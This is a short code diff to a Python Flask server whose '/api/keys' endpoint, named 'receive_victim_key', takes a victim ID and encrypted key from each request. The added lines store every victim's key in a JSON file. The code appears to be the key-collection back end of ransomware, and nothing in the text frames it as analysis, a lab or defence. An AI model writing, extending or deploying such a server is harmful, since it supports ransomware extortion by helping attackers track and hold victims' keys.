@@ -8,6 +8,22 @@ app = Flask(__name__)
 @app.route('/api/keys', methods=['POST'])
 def receive_victim_key():
     data = request.json
+    victim_id = data.get('victim_id', 'UNKNOWN')
+    encrypted_key = data.get('encrypted_key', 'NONE')
+
+    # load existing victims from file
+    try:
+        with open('victims_keys.json', 'r') as f:
+            victims = json.load(f)
+    except:
+        victims = {}
+
+    # add new victim
+    victims[victim_id] = encrypted_key
+
+    # save to file
+    with open('victims_keys.json', 'w') as f:
+        json.dump(victims, f)
     
     # print to console
     print(f"Victim ID: {data.get('victim_id', 'UNKNOWN')}")
